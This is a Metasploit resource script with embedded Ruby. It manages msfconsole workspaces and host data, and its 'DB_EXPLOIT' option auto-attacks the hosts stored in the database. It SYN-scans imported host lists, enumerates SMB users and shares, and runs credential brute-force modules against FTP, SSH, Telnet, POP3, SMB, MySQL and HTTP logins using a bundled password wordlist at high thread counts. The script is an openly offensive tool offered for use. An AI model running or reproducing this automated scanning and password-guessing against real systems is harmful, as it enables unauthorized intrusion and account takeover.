<ruby>
   help = %Q|
    Description:
       This Metasploit RC file can be used to manage msfconsole database tasks:
       Display database data, record msfconsole activity, add hosts to database,
       import files.xml import list of hosts inside a text file (one-per-line-entries)
       auto-exploit db hosts by service name and clean all database data at exit.

    Execute in msfconsole:
       setg CLEAN <true-or-blank>
       setg RECORD <true-or-blank>
       setg DB_EXPLOIT <service-name>
       setg XML_EXPORT <true-or-blank>
       setg WORKSPACE <new-workspace-name>
       setg WORKSPACE_DEL <delete-workspace-name>
       setg DBHOST <asign-RHOSTS-var-to-msfconsole>
       setg XML_IMPORT <absoluct-path-of-file.xml-to-import>
       setg TXT_IMPORT <absoluct-path-of-hosts-list.txt-to-import>
       resource <path-to-script>/managedb.rc

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>
    |
    print_line(help)
    Rex::sleep(2.0)
    print_line("")


    if (framework.datastore['RECORD'] == "true")
       run_single("spool /root/database.log")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['WORKSPACE'] == nil or framework.datastore['WORKSPACE'] == '')
       run_single("workspace -a #{framework.datastore['WORKSPACE']}")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['WORKSPACE_DEL'] == nil or framework.datastore['WORKSPACE_DEL'] == '')
       run_single("workspace -d #{framework.datastore['WORKSPACE_DEL']}")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['DBHOST'] == nil or framework.datastore['DBHOST'] == '')
       run_single("hosts -a #{framework.datastore['DBHOST']}")
       Rex::sleep(1.0)
    end

    unless (framework.datastore['TXT_IMPORT'] == nil or framework.datastore['TXT_IMPORT'] == '')
       check_import = "#{framework.datastore['TXT_IMPORT']}"
       unless (File.exist?(check_import))
          print_error("[ERROR] File to be imported not found.")
          print_error("[ERROR] #{check_import}")
          return nil
       end
       import_txt = File.read(check_import)
          parse_data = import_txt.split(' ').join(' ')
          print_line("List of hosts to import")
          print_line("=======================")
          run_single("hosts -a #{parse_data}")
          Rex::sleep(1.5)
          print_status("Scanning new targets (syn scan)")
          Rex::sleep(1.0)
          run_single("use auxiliary/scanner/portscan/syn")
          run_single("set VERBOSE true")
          run_single("set THREADS 16")
          run_single("set PORTS 21-23,53,80,110,139,443,445,1433,3306,8080-8083")
          run_single("hosts -R")
          run_single("exploit")
          Rex::sleep(2.5)
    end

    unless (framework.datastore['XML_IMPORT'] == nil or framework.datastore['XML_IMPORT'] == '')
       xml_file = "#{framework.datastore['XML_IMPORT']}"
       print_status("Import xml: #{xml_file}")
       unless (File.exist?(xml_file))
          print_error("[ERROR] Script can not find the path inputed.")
          print_error("[ERROR] #{xml_file}")
          return nil
       end
       run_single("db_import #{framework.datastore['XML_IMPORT']}")
       Rex::sleep(1.0)
    end

    run_single("workspace -v")
    Rex::sleep(0.5)
    run_single("hosts -c address,name,os_name,os_flavor,os_sp,purpose")
    print_line("")
    Rex::sleep(0.5)
    run_single("services -c port,proto,name,state")
    Rex::sleep(2.0)
    print_line("")

    unless (framework.datastore['DB_EXPLOIT'] == nil or framework.datastore['DB_EXPLOIT'] == '')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:name).join(' ')
       unless proto =~ /#{framework.datastore['DB_EXPLOIT']}/i
            print_error("[ERROR] Service: [#{framework.datastore['DB_EXPLOIT']}] not found in db")
            Rex::sleep(2.5)
            run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
            return nil
       end
       run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
         if xport =~ /21/i or proto =~ /ftp/i
           if (framework.datastore['DB_EXPLOIT'] == "ftp")
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("services -c name -S ftp -R")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 70")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
           end
         end

         if xport =~ /22/i or proto =~ /ssh/i
           if (framework.datastore['DB_EXPLOIT'] == "ssh")
              print_warning("Remote Target port: 22 ssh found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 30")
              run_single("services -c name -S ssh -R")
              run_single("exploit")
           end
         end

         if xport =~ /23/i or proto =~ /telnet/i
           if (framework.datastore['DB_EXPLOIT'] == "telnet")
              print_warning("Remote Target port: 23 telnet found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S telnet -R")
              run_single("exploit")
           end
         end

         if xport =~ /110/i or proto =~ /pop3/i
           if (framework.datastore['DB_EXPLOIT'] == "pop3")
              print_warning("Remote Target port: 110 pop3 found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 30")
              run_single("services -c name -S pop3 -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S pop3 -R")
              run_single("exploit")
           end
         end

         if xport =~ /445/i or proto =~ /smb/i
           if (framework.datastore['DB_EXPLOIT'] == "smb")
              print_warning("Remote Target port: 445 smb found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S smb -R")
              run_single("exploit")
           end
         end

         if xport =~ /3306/i or proto =~ /mysql/i
           if (framework.datastore['DB_EXPLOIT'] == "mysql")
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
           end
         end

         if xport =~ /80/i or proto =~ /http/i
           if (framework.datastore['DB_EXPLOIT'] == "http")
              print_warning("Remote Target port: 80 http found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/http/title")
              run_single("services -c name -S http -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 11")
              run_single("services -c name -S http -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("services -c name -S http -R")
              run_single("exploit")
           end
         end
    end


   if (framework.datastore['XML_EXPORT'] == "true")
      print_warning("Exporting database to: /root/database.xml")
      Rex::sleep(1.5)
      run_single("db_export -f xml /root/database.xml")
   end

   print_warning("Please wait, Cleaning global variables.")
   Rex::sleep(1.5)
   if (framework.datastore['CLEAN'] == "true")
      run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
      run_single("unset VERBOSE THREADS PORTS")
      print_warning("Please wait, Cleaning database.")
      Rex::sleep(1.5)
      run_single("hosts -d")
      run_single("services -d")
      print_line("")
   else
      run_single("unsetg RHOSTS CLEAN RECORD DBHOST TXT_IMPORT XML_IMPORT XML_EXPORT WORKSPACE WORKSPACE_DEL DB_EXPLOIT")
      run_single("unset VERBOSE THREADS PORTS")
      print_line("")
   end

   print_line("")
   print_line("Resource Commands              Description")
   print_line("-----------------              -----------")
   print_line("setg CLEAN true                Clean database at exit")
   print_line("setg RECORD true               Record msfconsole activity")
   print_line("setg DBHOST 10.10.10.3         Asign RHOSTS var to msfconsole")
   print_line("setg WORKSPACE pedro           Add workspace pedro to database")
   print_line("setg WORKSPACE_DEL pedro       Delete workspace pedro from database")
   print_line("setg XML_EXPORT true           Export contents of db to database.xml")
   print_line("setg XML_IMPORT /root/dic.xml  Import database.xml file to db")
   print_line("setg TXT_IMPORT /root/dic.txt  Import text hosts list (one-per-line)")
   print_line("setg DB_EXPLOIT smb            Auto-Exploit db hosts based on service name")
   print_line("resource /root/managedb.rc     Execute this resource script")
   print_line("")

</ruby>
